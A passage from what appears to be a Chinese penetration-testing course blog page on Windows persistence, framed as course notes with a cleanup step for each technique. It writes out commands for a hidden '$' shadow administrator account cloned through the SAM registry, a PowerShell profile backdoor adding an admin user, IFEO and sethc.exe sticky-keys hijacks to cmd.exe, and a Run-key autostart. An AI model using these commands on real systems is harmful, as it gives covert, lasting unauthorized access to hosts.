+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_53742230/article/details/125917148">https://blog.csdn.net/qq_53742230&#x2F;article&#x2F;details&#x2F;125917148</a></p>
+<h3 id="windows权限维持"><a href="#windows权限维持" class="headerlink" title="windows权限维持"></a>windows权限维持</h3><h4 id="影子账户"><a href="#影子账户" class="headerlink" title="影子账户"></a>影子账户</h4><p>通常在拿到服务器后会创建一个带$符号的账户，因为在常规cmd下是无法查看到的。</p>
+<p>影子账户，顾名思义就是隐藏的账户，在“控制面板-用户账户”里面是看不见，但却有管理员权限的账户</p>
+<p>复现:</p>
+<p>第一步：创建一个带$符号的账户</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user garck$ abc123qq.. /add </span><br></pre></td></tr></table></figure>
+<p><img src="e5iYLJF8LedmScEbvYnN5S2jB7RblL5Gb_EJSRAUqMc.png" alt="image"></p>
+<p>第二步：打开注册表 </p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">regedit</span><br><span class="line">HEKY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users</span><br><span class="line"><span class="comment">//看不见的时候，是权限不够，需要给自己添加权限</span></span><br></pre></td></tr></table></figure>
+<p>garck$对应的是0x3ea，管理员对应的是0x1f4</p>
+<p><img src="NepAaZXSFMbM3C0J7EX8HT8_JwxVdO0NIjL3WXRjApw.png" alt="image"></p>
+<p>将管理员对应的F项的值，复制粘贴到garck$用户的对应F项的值。</p>
+<p><img src="Gy5MQX-p2p7UVqqEO2TZM4-nGiwDkgOyYAghCjZwuyU.png" alt="image"></p>
+<p><img src="u2-sqHWb3qKOAZ2tUoi5b5z0YrHfYDlxKOCKmlsHPaY.png" alt="image"></p>
+<p>第三步：导出用户及对应的项的注册表文件,分别命名为1.reg和2.reg，删除掉用户。</p>
+<p><img src="qYMpYH5OwCMDw2G4hMrta-p4uaysSzLGyhRgNQp6sxY.png" alt="image"></p>
+<p><img src="omC3WhIKndrpI5TdgNog114wh4W3vIKj1I_r8xJv8l0.png" alt="image"></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user garck$ /del</span><br></pre></td></tr></table></figure>
+<p>第四步：重新导入，分别双击reg文件即可。</p>
+<p><img src="93fMCptqk5yiGNIO5bx-dA-cv_jF1G2pKElM-SutqlI.png" alt="image"></p>
+<p>查看控制面板没发现用户</p>
+<p><img src="2AZj9K5TJhrARAHnkhnzGWj5TXRj1GsQGTksbAHOZSg.png" alt="image"></p>
+<p>第五步：登陆目标服务器，利用影子账号。</p>
+<p>首先，管理账户中并没有garck$账户</p>
+<p>远程登陆</p>
+<p><img src="EpQErN3imfpJlEvWZHjDJffpV4OgEis2X3bWF2RygNo.png" alt="image"></p>
+<h4 id="powershell配置文件后门"><a href="#powershell配置文件后门" class="headerlink" title="powershell配置文件后门"></a>powershell配置文件后门</h4><p>简介</p>
+<p>Windows PowerShell 是一种命令行外壳程序和脚本环境，使命令行用户和脚本编写者可以利用 .NET Framework的强大功能。</p>
+<p>Powershell配置文件其实就是一个powershell脚本，他可以在每次运行powershell的时候自动运行，所以可以通过向该文件写入自定义的语句用来长期维持权限。</p>
+<p>复现</p>
+<p>第一步：准备1.bat脚本，内容为：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user garck1 abc123QQ… /add &amp; net localgroup administrators garck1 /add</span><br></pre></td></tr></table></figure>
+<p>第二步：打开Windows PowerShell ，输入以下命令</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">echo $profile # 查看当前是否存在配置文件。</span><br><span class="line">Test-path $profile # 如果返回Flase 则可以进行配置</span><br><span class="line">New-Item -Path $profile -Type File –Force # 创建配置文件</span><br><span class="line">$string = ‘Start-Process “C:\<span class="number">1.</span>bat”’</span><br><span class="line">$string | Out-File -FilePath $profile -Append</span><br><span class="line">more $profile # 查看文件</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">echo $profile</span><br><span class="line">Test-path $profile</span><br><span class="line">New-Item -Path $profile -Type File –<span class="type">Force</span></span><br><span class="line"><span class="variable">$string</span> <span class="operator">=</span> ‘Start-Process “C:\<span class="number">1.</span>bat”’</span><br><span class="line">$string | Out-File -FilePath $profile -Append</span><br><span class="line">more $profile</span><br></pre></td></tr></table></figure>
+<p><img src="Wcku3532Ss7qXyQUqFEz-kHxP_R0MULW_UoZ0is0iRM.png" alt="image"></p>
+<p>第三步：重新打开powershell就会自动执行</p>
+<p><img src="8M41j3V5XSwr40ovzvear_JT7k-452YrHimQ9opVDgY.png" alt="image"></p>
+<h4 id="映像劫持技术"><a href="#映像劫持技术" class="headerlink" title="映像劫持技术"></a>映像劫持技术</h4><p>“映像劫持”，也被称为“IFEO”（Image File Execution Options），在WindowsNT架构的系统里，IFEO的本意是为一些在默认系统环境中运行时可能引发错误的程序执行体提供特殊的环境设定。</p>
+<p>当一个可执行程序位于IFEO的控制中时，它的内存分配则根据该程序的参数来设定，而WindowsN T架构的系统能通过这个注册表项使用与可执行程序文件名匹配的项目作为程序载入时的控制依据，最终得以设定一个程序的堆管理机制和一些辅助机制等。</p>
+<p>出于简化原因，IFEO使用忽略路径的方式来匹配它所要控制的程序文件名，所以程序无论放在哪个路径，只要名字没有变化，它就运行出问题。</p>
+<p>简单点说，当你打开的是程序A，而运行的却是程序B。</p>
+<p>实战：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">regedit</span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\WindowsNT\CurrentVersion\Image File Execution Options</span><br><span class="line"><span class="comment">//添加</span></span><br><span class="line">REG ADD <span class="string">&quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe&quot;</span> /v Debugger /t REG_SZ /d <span class="string">&quot;C:\windows\system32\cmd.exe&quot;</span></span><br><span class="line"><span class="comment">//删除</span></span><br><span class="line">REG delete <span class="string">&quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe&quot;</span> /v Debugger</span><br></pre></td></tr></table></figure>
+<p><img src="AvJwrLmkoqYwi594pWrhDH1rYQev8Bz9UEM0w3i9Wec.png" alt="image"></p>
+<p>添加成功之后，按五次shift键可以唤起cmd，删除之后就恢复原样了</p>
+<h4 id="shift后门"><a href="#shift后门" class="headerlink" title="shift后门"></a>shift后门</h4><p>辅助功能提供了其他选项（屏幕键盘、放大镜、屏幕阅读），可以帮助人更轻松地使用Windows操作系统，但是此功能可能会被滥用，以在已启用RDP且已获得管理员级别权限的主机上实现持久性。</p>
+<p>第一步：将sethc.exe拥有者改为administrator</p>
+<p><img src="-gB5hno1fy-eChGCZFOqvpU-jNdP1uwLns_nLicLbLI.png" alt="image"></p>
+<p>第二步：输入命令</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">move C:\windows\system32\sethc.exe C:\windows\system32\sethc1.exe</span><br><span class="line">Copy C:\windows\system32\cmd.exe C:\windows\system32\sethc.exe</span><br></pre></td></tr></table></figure>
+<p><img src="sd_NodwUT3H-n-usikCOaPvTv_YL-mATkQF31vpQHOI.png" alt="image"></p>
+<p>第三步：连续按5次shift</p>
+<p><img src="H-cgUqNM1Tr0VDCKvolc4Pph_PNBAEJKGLWxh-dFSdI.png" alt="image"></p>
+<p>远程连接之后</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">explorer</span><br></pre></td></tr></table></figure>
+<p>除了shift之外，还有以下这些也可以尝试</p>
+<p><img src="hGhcs_JFKhMC5SAGrYRqZdzh30Oxu6GlIqfdaDMXaRI.png" alt="image"></p>
+<p>恢复：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Copy C:\windows\system32\sethc1.exe C:\windows\system32\sethc.exe</span><br></pre></td></tr></table></figure>
+
+
+<h4 id="注册表自启动"><a href="#注册表自启动" class="headerlink" title="注册表自启动"></a>注册表自启动</h4><p>简介</p>
+<p>注册表是windows操作系统中的一个核心数据库，其中存放着各种参数，直接控制着windows的启动、硬件驱动程序的装载以及一些windows应用程序的运行，从而在整个系统中起着核心作用。</p>
+<p>这些作用包括了软、硬件的相关配置和状态信息，比如注册表中保存有应用程序和资源管理器外壳的初始条件、首选项和卸载数据等，联网计算机的整个系统的设置和各种许可，文件扩展名与应用程序的关联，硬件部件的描述、状态和属性，性能记录和其他底层的系统状态信息，以及其他数据等。</p>
+<p>复现</p>
+<p>第一步：输入命令</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">regedit</span><br><span class="line">reg add <span class="string">&quot;HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run&quot;</span> /v test2 /t REG_SZ /d <span class="string">&quot;C:\Windows\System32\notepad.exe&quot;</span> /f</span><br><span class="line">reg delete <span class="string">&quot;HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run&quot;</span> /v test2</span><br></pre></td></tr></table></figure>
+<p>第二步：重启服务器，自动会打开notepad.exe</p>
+<p><img src="8yJtvCaZ67iaLC-6QEmClZEEptViSQ0EWiqixhgLsmc.png" alt="image"></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">首页</a></li>
+        
+          <li><a href="/archives/">文章</a></li>
+        
+          <li><a href="/categories/">分类</a></li>
+        
+          <li><a href="/tags/">标签</a></li>
+        
+          <li><a href="/search/">搜索</a></li>
+        
+          <li><a href="/about/">关于</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#day5-%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80%E4%B8%89%EF%BC%88%E4%B8%8B%E5%8D%88%EF%BC%9A%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E3%80%81%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%EF%BC%89"><span class="toc-number">1.</span> <span class="toc-text">day5-内网渗透基础三（下午：权限提升、权限维持）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">1.1.</span> <span class="toc-text"></span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Linux"><span class="toc-number">1.1.1.</span> <span class="toc-text">Linux</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8F%90%E5%8D%87%E4%B8%BAroot"><span class="toc-number">1.1.1.1.</span> <span class="toc-text">提升为root</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Polkit%E6%BC%8F%E6%B4%9E%E6%8F%90%E6%9D%83"><span class="toc-number">1.1.1.1.1.</span> <span class="toc-text">Polkit漏洞提权</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#SUID%E6%8F%90%E6%9D%83"><span class="toc-number">1.1.1.1.2.</span> <span class="toc-text">SUID提权</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#sudo%E6%8F%90%E6%9D%83"><span class="toc-number">1.1.1.1.3.</span> <span class="toc-text">sudo提权</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83-CVE-2016-5195"><span class="toc-number">1.1.1.1.4.</span> <span class="toc-text">脏牛提权 CVE-2016-5195</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#docker-%E6%8F%90%E6%9D%83"><span class="toc-number">1.1.1.1.5.</span> <span class="toc-text">docker 提权</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#windows"><span class="toc-number">1.1.2.</span> <span class="toc-text">windows</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#ms-14-068%E6%8F%90%E5%8D%87%E4%B8%BA%E5%9F%9F%E7%AE%A1%E7%90%86"><span class="toc-number">1.1.2.1.</span> <span class="toc-text">ms-14-068提升为域管理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8F%90%E5%8D%87%E4%B8%BAsystem"><span class="toc-number">1.1.2.2.</span> <span class="toc-text">提升为system</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%83%82%E5%9C%9F%E8%B1%86%E6%8F%90%E6%9D%83%EF%BC%88CVE-2016-3225%EF%BC%89"><span class="toc-number">1.1.2.2.1.</span> <span class="toc-text">烂土豆提权（CVE-2016-3225）</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#CVE-2020-0787%E6%8F%90%E6%9D%83"><span class="toc-number">1.1.2.2.2.</span> <span class="toc-text">CVE-2020-0787提权</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#PrintSpoofer%E6%8F%90%E6%9D%83"><span class="toc-number">1.1.2.2.3.</span> <span class="toc-text">PrintSpoofer提权</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF"><span class="toc-number">1.2.</span> <span class="toc-text">权限维持技术</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#linux%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81"><span class="toc-number">1.2.1.</span> <span class="toc-text">linux权限维持</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B7%BB%E5%8A%A0suid%E5%90%8E%E9%97%A8"><span class="toc-number">1.2.1.1.</span> <span class="toc-text">添加suid后门</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SSH-%E8%BD%AF%E8%BF%9E%E6%8E%A5%E5%90%8E%E9%97%A8"><span class="toc-number">1.2.1.2.</span> <span class="toc-text">SSH 软连接后门</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SSH-%E5%85%AC%E9%92%A5%E5%85%8D%E5%AF%86%E7%A0%81%E7%99%BB%E9%99%86"><span class="toc-number">1.2.1.3.</span> <span class="toc-text">SSH 公钥免密码登陆</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%94%AE%E7%9B%98%E8%AE%B0%E5%BD%95"><span class="toc-number">1.2.1.4.</span> <span class="toc-text">键盘记录</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Rootkit"><span class="toc-number">1.2.1.5.</span> <span class="toc-text">Rootkit</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81"><span class="toc-number">1.2.2.</span> <span class="toc-text">windows权限维持</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BD%B1%E5%AD%90%E8%B4%A6%E6%88%B7"><span class="toc-number">1.2.2.1.</span> <span class="toc-text">影子账户</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#powershell%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E5%90%8E%E9%97%A8"><span class="toc-number">1.2.2.2.</span> <span class="toc-text">powershell配置文件后门</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%98%A0%E5%83%8F%E5%8A%AB%E6%8C%81%E6%8A%80%E6%9C%AF"><span class="toc-number">1.2.2.3.</span> <span class="toc-text">映像劫持技术</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#shift%E5%90%8E%E9%97%A8"><span class="toc-number">1.2.2.4.</span> <span class="toc-text">shift后门</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%A8%E5%86%8C%E8%A1%A8%E8%87%AA%E5%90%AF%E5%8A%A8"><span class="toc-number">1.2.2.5.</span> <span class="toc-text">注册表自启动</span></a></li></ol></li></ol></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://garckz.github.io/2022/08/16/day5-%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80%E4%B8%89%EF%BC%88%E4%B8%8B%E5%8D%88%EF%BC%9A%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E3%80%81%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%EF%BC%89/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://garckz.github.io/2022/08/16/day5-%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80%E4%B8%89%EF%BC%88%E4%B8%8B%E5%8D%88%EF%BC%9A%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E3%80%81%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%EF%BC%89/&text=day5-内网渗透基础三（下午：权限提升、权限维持）"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://garckz.github.io/2022/08/16/day5-%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80%E4%B8%89%EF%BC%88%E4%B8%8B%E5%8D%88%EF%BC%9A%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E3%80%81%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%EF%BC%89/&title=day5-内网渗透基础三（下午：权限提升、权限维持）"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://garckz.github.io/2022/08/16/day5-%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80%E4%B8%89%EF%BC%88%E4%B8%8B%E5%8D%88%EF%BC%9A%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E3%80%81%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%EF%BC%89/&is_video=false&description=day5-内网渗透基础三（下午：权限提升、权限维持）"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=day5-内网渗透基础三（下午：权限提升、权限维持）&body=Check out this article: https://garckz.github.io/2022/08/16/day5-%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80%E4%B8%89%EF%BC%88%E4%B8%8B%E5%8D%88%EF%BC%9A%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E3%80%81%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%EF%BC%89/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://garckz.github.io/2022/08/16/day5-%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80%E4%B8%89%EF%BC%88%E4%B8%8B%E5%8D%88%EF%BC%9A%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E3%80%81%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%EF%BC%89/&title=day5-内网渗透基础三（下午：权限提升、权限维持）"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://garckz.github.io/2022/08/16/day5-%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80%E4%B8%89%EF%BC%88%E4%B8%8B%E5%8D%88%EF%BC%9A%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E3%80%81%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%EF%BC%89/&title=day5-内网渗透基础三（下午：权限提升、权限维持）"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://garckz.github.io/2022/08/16/day5-%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80%E4%B8%89%EF%BC%88%E4%B8%8B%E5%8D%88%EF%BC%9A%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E3%80%81%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%EF%BC%89/&title=day5-内网渗透基础三（下午：权限提升、权限维持）"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://garckz.github.io/2022/08/16/day5-%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80%E4%B8%89%EF%BC%88%E4%B8%8B%E5%8D%88%EF%BC%9A%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E3%80%81%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%EF%BC%89/&title=day5-内网渗透基础三（下午：权限提升、权限维持）"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://garckz.github.io/2022/08/16/day5-%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80%E4%B8%89%EF%BC%88%E4%B8%8B%E5%8D%88%EF%BC%9A%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E3%80%81%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%EF%BC%89/&name=day5-内网渗透基础三（下午：权限提升、权限维持）&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://garckz.github.io/2022/08/16/day5-%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80%E4%B8%89%EF%BC%88%E4%B8%8B%E5%8D%88%EF%BC%9A%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E3%80%81%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%EF%BC%89/&t=day5-内网渗透基础三（下午：权限提升、权限维持）"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+    <div class="footer-left">
+        Copyright &copy;
+        
+        
+        2019-2023
+        Garck3h
+    </div>
+    <div class="footer-right">
+        <nav>
+
+            <ul>
+                
+                    <!-- 不蒜子统计 -->
+                    <span id="busuanzi_container_site_pv">
+                  本站总访问量<span id="busuanzi_value_site_pv"></span>次
+              </span>
+
+                    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+                
+            </ul>
+
+
+        </nav>
+    </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
